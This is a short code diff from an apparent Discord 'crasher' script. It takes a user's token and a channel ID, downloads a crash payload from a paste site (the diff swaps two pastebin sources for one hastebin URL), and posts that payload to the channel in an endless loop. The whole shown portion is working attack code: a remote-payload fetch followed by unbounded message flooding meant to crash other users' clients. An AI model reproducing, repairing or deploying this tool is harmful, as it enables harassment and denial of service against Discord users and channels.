@@ -49,12 +49,11 @@ def crash():
     print(f'[{Fore.RED}>{Fore.RESET}] Your token', end=''); token = str(input('  :  '))
     print(f'[{Fore.RED}>{Fore.RESET}] Channel id', end=''); channel = str(input('  :  '))
     headers = {'Authorization': token}
-    crash_code = urlopen(Request("https://pastebin.com/raw/6VPMsXYA")).read().decode()
-    crash_code1 = urlopen(Request("https://pastebin.com/raw/sCCMa3cK")).read().decode()
+    crash_code = urlopen(Request("https://hastebin.com/raw/hopupotisa")).read().decode()
     print('Started Crashing...')
     while True:    
         requests.post(f'https://discordapp.com/api/v6/channels/{channel}/messages', headers=headers, json={'content':crash_code})
-        requests.post(f'https://discordapp.com/api/v6/channels/{channel}/messages', headers=headers, json={'content':crash_code1})
+       
 
 
 
